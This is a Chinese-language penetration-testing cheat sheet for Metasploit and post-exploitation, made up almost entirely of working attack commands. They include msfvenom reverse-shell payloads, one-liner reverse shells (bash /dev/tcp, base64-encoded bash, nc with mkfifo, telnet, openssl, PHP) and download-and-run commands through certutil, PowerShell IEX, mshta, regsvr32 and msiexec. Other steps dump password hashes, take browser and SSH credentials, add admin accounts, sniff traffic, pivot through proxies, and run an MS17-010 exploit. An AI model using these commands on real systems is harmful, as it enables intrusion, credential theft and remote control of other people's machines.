
[[TOC]]
## 常用命令

### msfconsole
```
$ msfconsole -r handler.rc        # 执行脚本

# handler.rc
use xxxx
set payload xxx/reverse_tcp
set lhost xxx
set lport xxx
run -j
```
###  meterpreter
```sh
meterpreter> background # 挂起到后台
```

## 流程

```
1. 生成paylaod
2. 监听handler -H
3. 连接后 普通用户 getsystem/getuid/hashdump/
4. 迁移进程

```

[Metasploit：MSF单独添加exploit与更新整个Metasploit框架](https://www.mscto.com/void/186894)


## 站库分离, 只拿到web怎样连数据库
sql ip:.1.2   -- web ip: .1.3
通过转发 比如1521 通过将.1.3 端口转发到到本机 msf

```
use xxxx
# use exploit/multi/script/web_delivery
use exploit/multi/handler
show payloads
set payload windows/x64/meterpreter/reverse_tcp
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.159.130
set lport 1234
msf5 > show targets

meterpreter > background
msf5 > jobs
handler -H 192.168.80.103 -P 1124 -p windows/meterpreter/reverse_tcp
sessions -i 1  # 选session
meterpreter > ps
meterpreter > migrate
meterpreter > shell
```

shell
```
net user xx a /add  # 可能被360阻止
```

## 生成程序
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.130 lport=4444 -f exe -o demox64.exe
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.159.130 LPORT=4444 -f exe > shell.exe

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.159.130
set LPORT  4444
run
meterpreter > upload /root/fscan64.exe
# 1.ipconfig 查看网段, 
# 2.arp -a
# 2.1 route print
# 3. fscan扫描 横向移动
```

## 一些命令
```
msf5> search web_delivery
msf5> use 1 
msf5> show targets
```

开后3389远程桌面:
```bash
run post/windows/manage/enable_rdp
run getgui-e
```
可以利用该命令,在目标机器上添加用户:
```bash
run getgui -u admin -p admin
net localgroup administrators admin/add
```
远程连接桌面
`rdesktop-u username-p password ip`

查看远程桌面
```
screenshot
use espia
screen grab
screen share
```
删除指定账号

`run post/windows/manage/delete user USERNAME=admin`
### meterpeter

run post/windows/gather/hashdump
run vnc

### sessions
sessions -k id号 #关闭session
### 数据包抓取

抓包:
```bash
Load sniffer
sniffer_interfaces
sniffer_start 2
sniffer_dump 2 1.cap
```

解码:

```bash
Use auxiliary/sniffer/psnuffle
Set PCAPFILE 1.cap
exploit
```

### 口令破解

```
hashdump  // 需要system权限
use post/windows/gather/hashdump //system权限的meterpreter
set session 1
exploit //结果保存在tmp目录下

use post/windows/gather/smart_hashdump
set session 1
exploit

getpid  // 查看自己的id
getsystem
ps
migrate <pid> // 迁移到system进程再hashdump
```

格式:
用户名称: RID: LM-HASH 值: NT-HASH值

### Other
查看目标环境信息:
`run post/multi/gather/env`

查看firefox中存储的账号密码
`run post/multi/gather/firefox_creds`

查看ssh账号密码的密文信息,证书信息:
`run post/multi/gather/ssh_creds`

收集win集成信息
```
run winenum
/root/.msf4/logs/scripts/winenum
```

## MSF主机发现
模块位于源码路径的 modules/auxiliary/scanner/discovery
主要有:
arp_sweep
ipv6_mulitcast_ping
ipv6_neighbor
ipv6_neighbor_router_advertisement
udp_probe
udp_sweep
## MSF端口扫描
msf> search portscan
auxiliary/scanner/protscan/ack              //通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测
auxiliary/scanner/protscan/ftpbounce         //通过FTP bounce攻击的原理对TCP服务进行枚举,一些新的FTP服务器 软件能很好的防范此攻击,但在旧的系统上仍可以被利用
auxiliary/scanner/portscan/syn         //使用发送TCP SYN标志的方式探测开放端口
auxiliary/scanner/protscan/tcp         //通过一次完整的CP连接来判断端口是否开放最准确但是最慢
auxiliary/scanner/protscan/xmas         //一种更为隐秘的扫描方式,通过发送FIN·URG标志,能够躲避一些高级的TCP标记检测器的过滤

一般情况下推荐使用syn端口扫描器·速度较快·结果准确·不易被对方察觉
syn扫描器的使用
```bash
>use aux iary/scanner/prot scan/syn
>set RHOSTS 10.10.10.10/ 24
>set THREADS 20
>run
```

## 服务扫描与查点

确定开放端口后,对相应端口上所运行的服务信息进行挖掘
在Metasploit的Scanner辅助模块中,用于服务扫描和查点的工具常以[service_name]_version和
```
[service_name]_login命名
[service_name]_version可用于遍历网络中包含了某种服务的主机,并进一步确定服务的版本.
[service_name]_login 可对某种服务进行口令探测攻击
```
在msf终端中可以输入:
```bash
search name : _version
```
查看所有可用的服务查点模块

## sessions
```bash
sessions -i <id>
exit #退出 session
```
## 反弹shell
### 监听相关
```bash
exploit -j -z
# exploit/run 可在后台持续监听,
# -j为后台任务
# -z为持续监听，使用Jobs命令查看和管理后台任务。jobs 
jobs -K
# -K可结束所有任务。
```
### mshta | 反弹shell
```bash
# x86
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.159.130
msf exploit(windows/misc/hta_server) > exploit -j
mshta.exe http://192.168.1.227:8080/gwm6lZr.hta

# x64
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/misc/hta_server) > set target 1
msf exploit(windows/misc/hta_server) > set srvhost 192.168.159.130
msf exploit(windows/misc/hta_server) > run
mshta.exe http://192.168.159.130:8080/Sk6XhJP.hta

# x64 hta2
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.130 lport=4444 -f hta-psh -o 1.hta
msfconsole
msf5> handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.159.130 -P 4444
python3 -m http.server 8000

mshta.exe http://192.168.159.130:8000/1.hta

# https://www.jianshu.com/p/309d9a908333
```
### nc 无 -e | 反弹shell
```bash
# 攻击机
nc -lvp 7777

# 靶机
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.42.134 7777 >/tmp/f
或

mknod backpipe p; nc 47.101.214.85 6666 0<backpipe | /bin/bash 1>backpipe 2>backpipe
Linux mknod 命今用法详解·创建字符设备文件和块设备文件

```
[linux_io](11_linuxio.md)
### bash | 反弹shell
* 1. 普通
```bash
bash -i &> /dev/tcp/192.168.159.130/6666 0>&1
bash -i  > /dev/tcp/192.168.159.130/6666 0>&1 2>&1
```

* 2.base64

```bash
# base64:  bash -i >& /dev/tcp/192.168.159.130/6666 0>&1
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMzAvNjY2NiAwPiYx |base64 -d | bash -i"
```

`>& &>` :混合输出(正确、错误的输出都输出到一个地方)

* 3. 自定义描述符
```bash
exec 5<>/dev/tcp/192.168.239.128/443;cat <&5 | while read line; do $line 2>&5 >&5; done
```
### rundll32 | 反弹shell
```bash
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery)> set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/smb_delivery)> set srvhost 192.168.159.130
msf exploit(windows/smb/smb_delivery)> run -j
rundll32.exe \\192.168.159.130\obmPU\test.dll,0
```

### regsrv32 | 反弹shell
```bash
use exploit/multi/script/web_delivery
msf exploit(web_delivery)> set srvhost 192.168.159.130
msf exploit(web_delivery)> set target 3
msf exploit(web_delivery)> set payload windows/x64/meterpreter/reverse_tcp
msf exploit(web_delivery)> set lhost 192.168.159.130
msf exploit(web_delivery)> run -j
regsvr32 /s /n /u /i:http://192.168.159.130:8081/du3uxIZOGuCHOZVsct scrobj.dl
```

### exe | 反弹shell
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.130 lport=1234 -f exe > shell.exe
msfconsole
msf> handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.159.130 -P 1234
python3 -m http.server 8000
certutil.exe -urlcache -split -f http://192.168.159.130:8000/shell.exe shell.exe & shell.exe
certutil.exe -urlcache -split -f http://192.168.159.130:8000/shell.exe delete

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.159.130:8000/1.exe'),1.exe
powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.159.130:8000','notepad.exe');start-process notepad.exe
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.159.130:8000/powercat.ps1');1.exe"
# delete 清理缓存
```

x86
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.159.130 lport=1235 -f exe > shell86.exe
handler -p windows/meterpreter/reverse_tcp -H 192.168.159.130 -P 1235
```
### powershell | 反弹shell

```bash
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.159.130
run -j
```
### powercat | 反弹shell
```bash
# git clone https://github.com/besimorhino/powercat.git
python -m http.server 8000
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.159.130:8000/powercat.ps1');powercat -c 192.168.159.130 -p 1234 -e cmd"
```
### msiexec | 反弹shell
```ts
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.130 lport=4444 -f msi -o 1.msi
msfconsole
msf5 > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.159.130 -P 4444
```

新终端
```ts
python3 -m http.server 8000
```

靶机
```ts
msiexec /q /i http://192.168.159.130:8000/1.msi
```

### python | 反弹shell
```ts
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 0
msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lport 8888
msf5 exploit(multi/script/web_delivery) > set lhost 192.168.159.130
msf5 exploit(multi/script/web_delivery) > run -j
# 会显示 payload
```
### php | 反弹shell
1.
```ts
use exploit/multi/script/web_delivery
msf > set target 1
msf > set payload php/meterpreter/reverse_tcp
msf > set lport 8888
msf > set lhost 192.168.159.130
msf > run -j
```

2.
```ts
php -r '$sock=fsockopen("192.168.159.130",6666);exec("/bin/bash -i <&3 >&3 2>&3");'
msfvenom -p php/bind_php lport=6666 -f raw>bind_php.php
```
### telnet | 反弹shell
```ts
rm -f a && mknod a p && telnet 192.168.159.130 6666 0<a|/bin/bash 1>a
rm -f a; mknod a p;telnet 192.168.159.130 6666 0<a|/bin/bash 1>a
```

### openssl | 反弹shell 流量加密
```bash
# 1．在远程攻击主机上生成秘钥文件
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# 2．在远程攻击主机上启动监视器
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
# 3．在目标机上反弹shell
mkfifo /tmp/s;/bin/sh -i < /tmp/s 2>&1|openssl s_client -quiet -connect 192.168.159.130:443 > /tmp/s;rm/tmp/s
```

### meterpreter | 端口转发 portfwd

### 配置代理1级 | 反弹shell


一、攻击机 192.168.159.130

- 1.1 监听
```bash
msfconsole
handler -H 192.168.159.130 -P 1234 -p windows/x64/meterpreter/reverse_tcp
```

- 1.2 攻击方式
```sh
# hta, powershell都行
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.1 lport=1234 -f hta-psh -o 1.hta
```

二、代理机 192.168.159.1

1. http服务提供  http://192.168.159.1:8000/1.hta

2. 端口转发

- 方式 1 portfwd
```sh
portfwd.exe -l 1234 -a 192.168.159.130 -p 1234
portfwd.exe -l <local port> -a <remote address> -p <remote port> -t(unnel mode)
```

- 方式 2 netsh 端口转发
```bash
netsh interface portproxy add v4tov4 listenport=1234 connectaddress=192.168.159.130 connectport=1234
# netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.168.159.1  connectport=1234 connectaddress=192.168.159.130
# netsh interface portproxy reset
```
2.2.1 检查 IP Helper 服务开启

2.2.2 检查防火墙 如果打开需要手工配置相应的防火墙。

```sh
netsh advfirewall firewall add rule name=”forwarded_RDPport_1234”  protocol=TCP dir=in localip=192.168.159.1  localport=1234 action=allow
```

三、肉机
```ts
mshta.exe http://192.168.159.1:8000/1.hta
```

### 配置代理多级 | 反弹shell | post
[Metasploit渗透技巧：后渗透Meterpreter代理](https://blog.51cto.com/peilong0320/1607162)

#### 建立 socks5 代理

获得target1的meterpreter shell后,添加到192.168.22网段的路由
```ts
msf5 > run autoroute -s 192.168.22.0/24
msf5 > run autoroute -p
```
使用msf的socks5模块建立socks服务,并配置proxychains代理:

```bash
msf5 > use auxiliary/server/socks5
msf5 auxiliary(server/socks5) > run
# vim /etc/proxychains.conf
socks5
127.0.0.11080
```
## ms17_010 
```ts
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set proxies socks5:47.101.214.85:1888
set rhosts 192.168.33.33
run -j
```

## ngrok内网穿透

运行后得到
```
tcp://tree.idcfengye,com:10650 -> 127.0.0.1:10651
ping tree.idcfengye,com
=> 64.69.43.237
msfvenom -p windows/meterpreter/reverse tcp thost=64.69.43.237 lport=10650 -f exe 123.exe
handler -H 127.0.0.1 -P 10651 -p windows/meterpreter/reverse_tcp
```